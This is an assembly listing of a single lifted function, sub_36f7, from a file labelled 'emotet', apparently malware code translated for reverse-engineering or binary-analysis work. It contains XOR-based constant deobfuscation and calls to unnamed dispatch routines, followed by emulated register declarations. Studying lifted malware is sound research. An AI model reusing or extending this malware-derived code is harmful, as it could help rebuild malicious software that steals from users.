	.text
	.def	@feat.00;
	.scl	3;
	.type	0;
	.endef
	.globl	@feat.00
.set @feat.00, 1
	.intel_syntax noprefix
	.file	"emotet"
	.def	_sub_36f7;
	.scl	2;
	.type	32;
	.endef
	.globl	_sub_36f7                       # -- Begin function sub_36f7
	.p2align	4, 0x90
_sub_36f7:                              # @sub_36f7
# %bb.0:                                # %entry
	push	ebp
	push	ebx
	push	edi
	push	esi
	push	eax
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14071
	mov	ecx, dword ptr [_ebp]
	mov	eax, dword ptr [_esp]
	lea	edx, [eax - 4]
	mov	dword ptr [eax - 4], ecx
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14072
	mov	dword ptr [_ebp], edx
	mov	dword ptr [___unnamed_1], 14074
	mov	dword ptr [___unnamed_1+4], 0
	lea	ecx, [eax - 20]
	mov	esi, 19
	sub	esi, eax
	cmp	edx, 16
	setb	byte ptr [_cf]
	test	edx, esi
	mov	byte ptr [_az], 0
	sets	byte ptr [_of]
	test	ecx, ecx
	sete	byte ptr [_zf]
	sets	byte ptr [_sf]
	test	cl, cl
	setp	byte ptr [_pf]
	mov	dword ptr [_esp], ecx
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14077
	mov	ecx, dword ptr [_esi]
	lea	edx, [eax - 24]
	mov	dword ptr [eax - 24], ecx
	mov	dword ptr [_esp], edx
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14078
	mov	byte ptr [_az], 0
	mov	byte ptr [_cf], 0
	mov	byte ptr [_of], 0
	mov	byte ptr [_zf], 1
	mov	byte ptr [_sf], 0
	mov	byte ptr [_pf], 1
	mov	dword ptr [_esi], 0
	mov	dword ptr [___unnamed_1], 14080
	mov	dword ptr [___unnamed_1+4], 0
	lea	ecx, [eax - 28]
	mov	dword ptr [eax - 28], 0
	mov	dword ptr [_esp], ecx
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14081
	mov	ecx, dword ptr [_ebp]
	mov	ecx, dword ptr [ecx + 24]
	lea	edx, [eax - 32]
	mov	dword ptr [eax - 32], ecx
	mov	dword ptr [_esp], edx
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14084
	mov	ecx, dword ptr [_ebp]
	mov	ecx, dword ptr [ecx + 20]
	lea	edx, [eax - 36]
	mov	dword ptr [eax - 36], ecx
	mov	dword ptr [_esp], edx
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14087
	mov	ecx, dword ptr [_esi]
	lea	edx, [eax - 40]
	mov	dword ptr [eax - 40], ecx
	mov	dword ptr [_esp], edx
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14088
	mov	ecx, dword ptr [_ebp]
	mov	ecx, dword ptr [ecx + 12]
	lea	edx, [eax - 44]
	mov	dword ptr [eax - 44], ecx
	mov	dword ptr [_esp], edx
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14091
	mov	ecx, dword ptr [_ebp]
	mov	ecx, dword ptr [ecx + 8]
	lea	edx, [eax - 48]
	mov	dword ptr [eax - 48], ecx
	mov	dword ptr [_esp], edx
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14094
	mov	ecx, dword ptr [_esi]
	lea	edx, [eax - 52]
	mov	dword ptr [eax - 52], ecx
	mov	dword ptr [_esp], edx
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14095
	mov	ecx, dword ptr [_esi]
	lea	edx, [eax - 56]
	mov	dword ptr [eax - 56], ecx
	mov	dword ptr [_esp], edx
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14096
	mov	dword ptr [eax - 60], 14101
	add	eax, -60
	mov	dword ptr [_esp], eax
	push	137507
	call	___unnamed_2
	add	esp, 4
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14101
	mov	eax, dword ptr [_ebp]
	mov	dword ptr [eax - 16], 15246578
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14108
	mov	ecx, dword ptr [_esp]
	lea	eax, [ecx + 32]
	lea	edx, [ecx - 2147483648]
	cmp	ecx, -32
	setae	byte ptr [_cf]
	test	eax, edx
	mov	byte ptr [_az], 0
	sets	byte ptr [_of]
	test	eax, eax
	sete	byte ptr [_zf]
	sets	byte ptr [_sf]
	test	al, al
	setp	byte ptr [_pf]
	mov	dword ptr [_esp], eax
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14111
	mov	ecx, dword ptr [_ebp]
	mov	eax, 157808766
	xor	eax, dword ptr [ecx - 16]
	mov	byte ptr [_az], 0
	mov	byte ptr [_cf], 0
	mov	byte ptr [_of], 0
	sete	byte ptr [_zf]
	sets	byte ptr [_sf]
	test	al, al
	setp	byte ptr [_pf]
	mov	dword ptr [ecx - 16], eax
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14118
	mov	byte ptr [_az], 0
	mov	byte ptr [_cf], 0
	mov	byte ptr [_of], 0
	mov	byte ptr [_zf], 1
	mov	byte ptr [_sf], 0
	mov	byte ptr [_pf], 1
	mov	dword ptr [_edx], 0
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14120
	mov	ecx, dword ptr [_ebp]
	mov	eax, 159923685
	xor	eax, dword ptr [ecx - 16]
	mov	byte ptr [_az], 0
	mov	byte ptr [_cf], 0
	mov	byte ptr [_of], 0
	sete	byte ptr [_zf]
	sets	byte ptr [_sf]
	test	al, al
	setp	byte ptr [_pf]
	mov	dword ptr [ecx - 16], eax
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14127
	mov	eax, dword ptr [_ebp]
	mov	dword ptr [eax - 12], 16386218
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14134
	mov	ecx, dword ptr [_ebp]
	mov	eax, dword ptr [ecx - 12]
	mov	edx, eax
	shl	edx, 6
	sete	byte ptr [_zf]
	sets	byte ptr [_sf]
	test	dl, dl
	setp	byte ptr [_pf]
	mov	dword ptr [ecx - 12], edx
	shr	eax, 26
	and	eax, 1
	mov	byte ptr [_cf], al
	mov	byte ptr [_of], 0
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14138
	mov	ecx, dword ptr [_ebp]
	mov	eax, 1048703726
	xor	eax, dword ptr [ecx - 12]
	mov	byte ptr [_az], 0
	mov	byte ptr [_cf], 0
	mov	byte ptr [_of], 0
	sete	byte ptr [_zf]
	sets	byte ptr [_sf]
	test	al, al
	setp	byte ptr [_pf]
	mov	dword ptr [ecx - 12], eax
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14145
	mov	eax, dword ptr [_ebp]
	mov	dword ptr [eax - 8], 229867
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14152
	mov	eax, dword ptr [_ebp]
	mov	edx, dword ptr [eax - 8]
	lea	ecx, [edx + 7838]
	lea	esi, [edx - 2147483648]
	test	dl, 14
	setne	byte ptr [_az]
	cmp	edx, -7838
	setae	byte ptr [_cf]
	test	ecx, esi
	sets	byte ptr [_of]
	test	ecx, ecx
	sete	byte ptr [_zf]
	sets	byte ptr [_sf]
	test	cl, cl
	setp	byte ptr [_pf]
	mov	dword ptr [eax - 8], ecx
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14159
	mov	ecx, dword ptr [_ebp]
	mov	eax, 985971
	xor	eax, dword ptr [ecx - 8]
	mov	byte ptr [_az], 0
	mov	byte ptr [_cf], 0
	mov	byte ptr [_of], 0
	sete	byte ptr [_zf]
	sets	byte ptr [_sf]
	test	al, al
	setp	byte ptr [_pf]
	mov	dword ptr [ecx - 8], eax
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14166
	mov	eax, dword ptr [_ebp]
	mov	dword ptr [eax - 4], 11850407
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14173
	mov	eax, dword ptr [_ebp]
	mov	eax, dword ptr [eax - 4]
	mov	dword ptr [_eax], eax
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14176
	mov	esi, dword ptr [_esp]
	lea	eax, [esi - 4]
	mov	dword ptr [esp], eax            # 4-byte Spill
	mov	dword ptr [esi - 4], 80
	mov	dword ptr [_esp], eax
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14178
	mov	ebx, dword ptr [esi - 4]
	mov	dword ptr [_ecx], ebx
	mov	dword ptr [_esp], esi
	mov	dword ptr [___unnamed_1], 14179
	mov	dword ptr [___unnamed_1+4], 0
	mov	ebp, dword ptr [_eax]
	mov	edi, dword ptr [_edx]
	push	0
	push	ebx
	push	edi
	push	ebp
	call	__aulldiv
	mov	dword ptr [_eax], eax
	push	0
	push	ebx
	push	edi
	push	ebp
	call	__aullrem
	mov	dword ptr [_edx], eax
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14181
	mov	dword ptr [esi - 4], -1668266032
	mov	eax, dword ptr [esp]            # 4-byte Reload
	mov	dword ptr [_esp], eax
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14186
	mov	eax, dword ptr [_eax]
	mov	ecx, dword ptr [_ebp]
	mov	dword ptr [ecx - 4], eax
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14189
	mov	ecx, dword ptr [_ebp]
	mov	eax, dword ptr [ecx - 4]
	mov	edx, eax
	shr	edx, 12
	sete	byte ptr [_zf]
	mov	byte ptr [_sf], 0
	test	dl, dl
	setp	byte ptr [_pf]
	mov	dword ptr [ecx - 4], edx
	shr	eax, 11
	and	eax, 1
	mov	byte ptr [_cf], al
	mov	byte ptr [_of], 0
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14193
	mov	ecx, dword ptr [_ebp]
	mov	eax, 508039
	xor	eax, dword ptr [ecx - 4]
	mov	byte ptr [_az], 0
	mov	byte ptr [_cf], 0
	mov	byte ptr [_of], 0
	sete	byte ptr [_zf]
	sets	byte ptr [_sf]
	test	al, al
	setp	byte ptr [_pf]
	mov	dword ptr [ecx - 4], eax
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14200
	mov	eax, dword ptr [_ebp]
	mov	ecx, dword ptr [eax - 4]
	mov	dword ptr [_eax], ecx
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14203
	mov	ecx, dword ptr [eax - 8]
	mov	dword ptr [_eax], ecx
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14206
	mov	ecx, dword ptr [eax - 12]
	mov	dword ptr [_eax], ecx
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14209
	mov	eax, dword ptr [eax - 16]
	mov	dword ptr [_eax], eax
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14212
	mov	ecx, dword ptr [_ecx]
	mov	eax, dword ptr [_esp]
	lea	edx, [eax - 4]
	mov	dword ptr [eax - 4], ecx
	mov	dword ptr [_esp], edx
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14213
	lea	ecx, [eax - 8]
	mov	dword ptr [eax - 8], 1989985150
	mov	dword ptr [_esp], ecx
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14218
	mov	ecx, dword ptr [_ecx]
	lea	edx, [eax - 12]
	mov	dword ptr [eax - 12], ecx
	mov	dword ptr [_esp], edx
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14219
	mov	ecx, dword ptr [_ecx]
	lea	edx, [eax - 16]
	mov	dword ptr [eax - 16], ecx
	mov	dword ptr [_esp], edx
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14220
	lea	ecx, [eax - 20]
	mov	dword ptr [eax - 20], 99
	mov	dword ptr [_esp], ecx
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14222
	mov	esi, dword ptr [eax - 20]
	mov	dword ptr [_ecx], esi
	mov	dword ptr [_esp], edx
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14223
	mov	dword ptr [eax - 20], 14228
	mov	dword ptr [_esp], ecx
	push	5897
	call	___unnamed_2
	add	esp, 4
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14228
	mov	eax, dword ptr [_esp]
	lea	ecx, [eax + 20]
	mov	edx, eax
	not	edx
	lea	esi, [eax - 2147483648]
	test	dl, 12
	sete	byte ptr [_az]
	cmp	eax, -20
	setae	byte ptr [_cf]
	test	ecx, esi
	sets	byte ptr [_of]
	test	ecx, ecx
	sete	byte ptr [_zf]
	sets	byte ptr [_sf]
	test	cl, cl
	setp	byte ptr [_pf]
	mov	dword ptr [_esp], ecx
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14231
	mov	ecx, dword ptr [_esi]
	lea	edx, [eax + 16]
	mov	dword ptr [eax + 16], ecx
	mov	dword ptr [_esp], edx
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14232
	mov	ecx, dword ptr [_esi]
	lea	edx, [eax + 12]
	mov	dword ptr [eax + 12], ecx
	mov	dword ptr [_esp], edx
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14233
	mov	ecx, dword ptr [_esi]
	lea	edx, [eax + 8]
	mov	dword ptr [eax + 8], ecx
	mov	dword ptr [_esp], edx
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14234
	mov	ecx, dword ptr [_esi]
	lea	edx, [eax + 4]
	mov	dword ptr [eax + 4], ecx
	mov	dword ptr [_esp], edx
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14235
	mov	dword ptr [eax], 14237
	mov	dword ptr [_esp], eax
	push	dword ptr [_eax]
	call	___unnamed_2
	add	esp, 4
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14237
	mov	eax, dword ptr [_esp]
	mov	ecx, dword ptr [eax]
	mov	dword ptr [_esi], ecx
	add	eax, 4
	mov	dword ptr [_esp], eax
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14238
	mov	eax, dword ptr [_ebp]
	mov	dword ptr [_esp], eax
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14240
	mov	ecx, dword ptr [eax]
	mov	dword ptr [_ebp], ecx
	lea	ecx, [eax + 4]
	mov	dword ptr [_esp], ecx
	mov	dword ptr [___unnamed_1+4], 0
	mov	dword ptr [___unnamed_1], 14241
	mov	ecx, dword ptr [eax + 4]
	add	eax, 8
	mov	dword ptr [_esp], eax
	push	ecx
	call	___unnamed_3
	add	esp, 8
	pop	esi
	pop	edi
	pop	ebx
	pop	ebp
	ret
                                        # -- End function
	.lcomm	___unnamed_1,8,8                # @0
	.lcomm	_cf,1                           # @cf
	.lcomm	_pf,1                           # @pf
	.lcomm	_az,1                           # @az
	.lcomm	_zf,1                           # @zf
	.lcomm	_sf,1                           # @sf
	.lcomm	_tf,1                           # @tf
	.lcomm	_if,1                           # @if
	.lcomm	_df,1                           # @df
	.lcomm	_of,1                           # @of
	.lcomm	_iopl,1                         # @iopl
	.lcomm	_nt,1                           # @nt
	.lcomm	_rf,1                           # @rf
	.lcomm	_vm,1                           # @vm
	.lcomm	_ac,1                           # @ac
	.lcomm	_vif,1                          # @vif
	.lcomm	_vip,1                          # @vip
	.lcomm	_id,1                           # @id
	.lcomm	_eflags,4,4                     # @eflags
	.lcomm	_ss,2,2                         # @ss
	.lcomm	_cs,2,2                         # @cs
	.lcomm	_ds,2,2                         # @ds
	.lcomm	_es,2,2                         # @es
	.lcomm	_fs,2,2                         # @fs
	.lcomm	_gs,2,2                         # @gs
	.lcomm	_st0,16,16                      # @st0
	.lcomm	_st1,16,16                      # @st1
	.lcomm	_st2,16,16                      # @st2
	.lcomm	_st3,16,16                      # @st3
	.lcomm	_st4,16,16                      # @st4
	.lcomm	_st5,16,16                      # @st5
	.lcomm	_st6,16,16                      # @st6
	.lcomm	_st7,16,16                      # @st7
	.lcomm	_fpu_stat_IE,1                  # @fpu_stat_IE
	.lcomm	_fpu_stat_DE,1                  # @fpu_stat_DE
	.lcomm	_fpu_stat_ZE,1                  # @fpu_stat_ZE
	.lcomm	_fpu_stat_OE,1                  # @fpu_stat_OE
	.lcomm	_fpu_stat_UE,1                  # @fpu_stat_UE
	.lcomm	_fpu_stat_PE,1                  # @fpu_stat_PE
	.lcomm	_fpu_stat_SF,1                  # @fpu_stat_SF
	.lcomm	_fpu_stat_ES,1                  # @fpu_stat_ES
	.lcomm	_fpu_stat_C0,1                  # @fpu_stat_C0
	.lcomm	_fpu_stat_C1,1                  # @fpu_stat_C1
	.lcomm	_fpu_stat_C2,1                  # @fpu_stat_C2
	.lcomm	_fpu_stat_C3,1                  # @fpu_stat_C3
	.lcomm	_fpu_stat_TOP,1                 # @fpu_stat_TOP
	.lcomm	_fpu_stat_B,1                   # @fpu_stat_B
	.lcomm	_fpu_control_IM,1               # @fpu_control_IM
	.lcomm	_fpu_control_DM,1               # @fpu_control_DM
	.lcomm	_fpu_control_ZM,1               # @fpu_control_ZM
	.lcomm	_fpu_control_OM,1               # @fpu_control_OM
	.lcomm	_fpu_control_UM,1               # @fpu_control_UM
	.lcomm	_fpu_control_PM,1               # @fpu_control_PM
	.lcomm	_fpu_control_PC,1               # @fpu_control_PC
	.lcomm	_fpu_control_RC,1               # @fpu_control_RC
	.lcomm	_fpu_control_X,1                # @fpu_control_X
	.lcomm	_fp0,8,8                        # @fp0
	.lcomm	_fp1,8,8                        # @fp1
	.lcomm	_fp2,8,8                        # @fp2
	.lcomm	_fp3,8,8                        # @fp3
	.lcomm	_fp4,8,8                        # @fp4
	.lcomm	_fp5,8,8                        # @fp5
	.lcomm	_fp6,8,8                        # @fp6
	.lcomm	_fp7,8,8                        # @fp7
	.lcomm	_k0,8,8                         # @k0
	.lcomm	_k1,8,8                         # @k1
	.lcomm	_k2,8,8                         # @k2
	.lcomm	_k3,8,8                         # @k3
	.lcomm	_k4,8,8                         # @k4
	.lcomm	_k5,8,8                         # @k5
	.lcomm	_k6,8,8                         # @k6
	.lcomm	_k7,8,8                         # @k7
	.lcomm	_mm0,8,8                        # @mm0
	.lcomm	_mm1,8,8                        # @mm1
	.lcomm	_mm2,8,8                        # @mm2
	.lcomm	_mm3,8,8                        # @mm3
	.lcomm	_mm4,8,8                        # @mm4
	.lcomm	_mm5,8,8                        # @mm5
	.lcomm	_mm6,8,8                        # @mm6
	.lcomm	_mm7,8,8                        # @mm7
	.lcomm	_xmm0,16,8                      # @xmm0
	.lcomm	_xmm1,16,8                      # @xmm1
	.lcomm	_xmm2,16,8                      # @xmm2
	.lcomm	_xmm3,16,8                      # @xmm3
	.lcomm	_xmm4,16,8                      # @xmm4
	.lcomm	_xmm5,16,8                      # @xmm5
	.lcomm	_xmm6,16,8                      # @xmm6
	.lcomm	_xmm7,16,8                      # @xmm7
	.lcomm	_xmm8,16,8                      # @xmm8
	.lcomm	_xmm9,16,8                      # @xmm9
	.lcomm	_xmm10,16,8                     # @xmm10
	.lcomm	_xmm11,16,8                     # @xmm11
	.lcomm	_xmm12,16,8                     # @xmm12
	.lcomm	_xmm13,16,8                     # @xmm13
	.lcomm	_xmm14,16,8                     # @xmm14
	.lcomm	_xmm15,16,8                     # @xmm15
	.lcomm	_xmm16,16,8                     # @xmm16
	.lcomm	_xmm17,16,8                     # @xmm17
	.lcomm	_xmm18,16,8                     # @xmm18
	.lcomm	_xmm19,16,8                     # @xmm19
	.lcomm	_xmm20,16,8                     # @xmm20
	.lcomm	_xmm21,16,8                     # @xmm21
	.lcomm	_xmm22,16,8                     # @xmm22
	.lcomm	_xmm23,16,8                     # @xmm23
	.lcomm	_xmm24,16,8                     # @xmm24
	.lcomm	_xmm25,16,8                     # @xmm25
	.lcomm	_xmm26,16,8                     # @xmm26
	.lcomm	_xmm27,16,8                     # @xmm27
	.lcomm	_xmm28,16,8                     # @xmm28
	.lcomm	_xmm29,16,8                     # @xmm29
	.lcomm	_xmm30,16,8                     # @xmm30
	.lcomm	_xmm31,16,8                     # @xmm31
	.lcomm	_ymm0,32,16                     # @ymm0
	.lcomm	_ymm1,32,16                     # @ymm1
	.lcomm	_ymm2,32,16                     # @ymm2
	.lcomm	_ymm3,32,16                     # @ymm3
	.lcomm	_ymm4,32,16                     # @ymm4
	.lcomm	_ymm5,32,16                     # @ymm5
	.lcomm	_ymm6,32,16                     # @ymm6
	.lcomm	_ymm7,32,16                     # @ymm7
	.lcomm	_ymm8,32,16                     # @ymm8
	.lcomm	_ymm9,32,16                     # @ymm9
	.lcomm	_ymm10,32,16                    # @ymm10
	.lcomm	_ymm11,32,16                    # @ymm11
	.lcomm	_ymm12,32,16                    # @ymm12
	.lcomm	_ymm13,32,16                    # @ymm13
	.lcomm	_ymm14,32,16                    # @ymm14
	.lcomm	_ymm15,32,16                    # @ymm15
	.lcomm	_ymm16,32,16                    # @ymm16
	.lcomm	_ymm17,32,16                    # @ymm17
	.lcomm	_ymm18,32,16                    # @ymm18
	.lcomm	_ymm19,32,16                    # @ymm19
	.lcomm	_ymm20,32,16                    # @ymm20
	.lcomm	_ymm21,32,16                    # @ymm21
	.lcomm	_ymm22,32,16                    # @ymm22
	.lcomm	_ymm23,32,16                    # @ymm23
	.lcomm	_ymm24,32,16                    # @ymm24
	.lcomm	_ymm25,32,16                    # @ymm25
	.lcomm	_ymm26,32,16                    # @ymm26
	.lcomm	_ymm27,32,16                    # @ymm27
	.lcomm	_ymm28,32,16                    # @ymm28
	.lcomm	_ymm29,32,16                    # @ymm29
	.lcomm	_ymm30,32,16                    # @ymm30
	.lcomm	_ymm31,32,16                    # @ymm31
	.lcomm	_zmm0,64,16                     # @zmm0
	.lcomm	_zmm1,64,16                     # @zmm1
	.lcomm	_zmm2,64,16                     # @zmm2
	.lcomm	_zmm3,64,16                     # @zmm3
	.lcomm	_zmm4,64,16                     # @zmm4
	.lcomm	_zmm5,64,16                     # @zmm5
	.lcomm	_zmm6,64,16                     # @zmm6
	.lcomm	_zmm7,64,16                     # @zmm7
	.lcomm	_zmm8,64,16                     # @zmm8
	.lcomm	_zmm9,64,16                     # @zmm9
	.lcomm	_zmm10,64,16                    # @zmm10
	.lcomm	_zmm11,64,16                    # @zmm11
	.lcomm	_zmm12,64,16                    # @zmm12
	.lcomm	_zmm13,64,16                    # @zmm13
	.lcomm	_zmm14,64,16                    # @zmm14
	.lcomm	_zmm15,64,16                    # @zmm15
	.lcomm	_zmm16,64,16                    # @zmm16
	.lcomm	_zmm17,64,16                    # @zmm17
	.lcomm	_zmm18,64,16                    # @zmm18
	.lcomm	_zmm19,64,16                    # @zmm19
	.lcomm	_zmm20,64,16                    # @zmm20
	.lcomm	_zmm21,64,16                    # @zmm21
	.lcomm	_zmm22,64,16                    # @zmm22
	.lcomm	_zmm23,64,16                    # @zmm23
	.lcomm	_zmm24,64,16                    # @zmm24
	.lcomm	_zmm25,64,16                    # @zmm25
	.lcomm	_zmm26,64,16                    # @zmm26
	.lcomm	_zmm27,64,16                    # @zmm27
	.lcomm	_zmm28,64,16                    # @zmm28
	.lcomm	_zmm29,64,16                    # @zmm29
	.lcomm	_zmm30,64,16                    # @zmm30
	.lcomm	_zmm31,64,16                    # @zmm31
	.lcomm	_dr0,4,4                        # @dr0
	.lcomm	_dr1,4,4                        # @dr1
	.lcomm	_dr2,4,4                        # @dr2
	.lcomm	_dr3,4,4                        # @dr3
	.lcomm	_dr4,4,4                        # @dr4
	.lcomm	_dr5,4,4                        # @dr5
	.lcomm	_dr6,4,4                        # @dr6
	.lcomm	_dr7,4,4                        # @dr7
	.lcomm	_dr8,4,4                        # @dr8
	.lcomm	_dr9,4,4                        # @dr9
	.lcomm	_dr10,4,4                       # @dr10
	.lcomm	_dr11,4,4                       # @dr11
	.lcomm	_dr12,4,4                       # @dr12
	.lcomm	_dr13,4,4                       # @dr13
	.lcomm	_dr14,4,4                       # @dr14
	.lcomm	_dr15,4,4                       # @dr15
	.lcomm	_cr0,4,4                        # @cr0
	.lcomm	_cr1,4,4                        # @cr1
	.lcomm	_cr2,4,4                        # @cr2
	.lcomm	_cr3,4,4                        # @cr3
	.lcomm	_cr4,4,4                        # @cr4
	.lcomm	_cr5,4,4                        # @cr5
	.lcomm	_cr6,4,4                        # @cr6
	.lcomm	_cr7,4,4                        # @cr7
	.lcomm	_cr8,4,4                        # @cr8
	.lcomm	_cr9,4,4                        # @cr9
	.lcomm	_cr10,4,4                       # @cr10
	.lcomm	_cr11,4,4                       # @cr11
	.lcomm	_cr12,4,4                       # @cr12
	.lcomm	_cr13,4,4                       # @cr13
	.lcomm	_cr14,4,4                       # @cr14
	.lcomm	_cr15,4,4                       # @cr15
	.lcomm	_fpsw,4,4                       # @fpsw
	.lcomm	_eax,4,4                        # @eax
	.lcomm	_ecx,4,4                        # @ecx
	.lcomm	_edx,4,4                        # @edx
	.lcomm	_ebx,4,4                        # @ebx
	.lcomm	_esp,4,4                        # @esp
	.lcomm	_ebp,4,4                        # @ebp
	.lcomm	_esi,4,4                        # @esi
	.lcomm	_edi,4,4                        # @edi
	.lcomm	_eip,4,4                        # @eip
	.lcomm	_eiz,4,4                        # @eiz
